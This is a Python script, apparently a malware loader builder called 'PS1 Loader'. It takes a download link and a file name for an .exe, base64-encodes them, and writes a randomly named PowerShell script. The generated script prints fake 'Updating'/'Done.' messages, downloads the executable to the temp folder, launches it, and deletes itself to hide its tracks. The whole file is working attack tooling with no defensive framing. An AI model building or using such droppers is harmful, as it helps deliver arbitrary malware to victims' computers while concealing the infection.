import string 
import random
import os
import base64

print("""
    ___  ___ _   _                 _         
   | _ \/ __/ | | |   ___  __ _ __| |___ _ _ 
  _|  _/\__ \ | | |__/ _ \/ _` / _` / -_) '_|
 (_)_|  |___/_| |____\___/\__,_\__,_\___|_|  
 ---------------------------------------------
  Coded by: https://github.com/Dynam1c-52
""")
random = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
yo = f"{random}.ps1"
url = input('Enter direct download link to your .exe file:')
file = input('Enter exact name of .exe file on link you provided:')

def mailman(s):
    return base64.b64encode(s.encode()).decode()

def milf(s):
    return base64.b64decode(s).decode()

def roro():
    u = mailman(url)
    f = mailman(file)
    script = f'''
    $u = "{u}"
    $f = "{f}"
    Write-Host "Updating" -ForegroundColor White
    Write-Host "Done." -ForegroundColor White
    $url = [System.Text.Encoding]::UTF8.GetString(([System.Convert]::FromBase64String($u)))
    $file = [System.IO.Path]::GetTempPath() + [System.Text.Encoding]::UTF8.GetString(([System.Convert]::FromBase64String($f)))
    (New-Object System.Net.WebClient).DownloadFile($url,$file)
    Start-Process $file
    Remove-Item $MyInvocation.MyCommand.Path -Force
    '''
    return script

ps1Loader = roro()
with open(yo, "w") as name:
    name.write(ps1Loader)

print(f"{yo} saved to folder!!!")  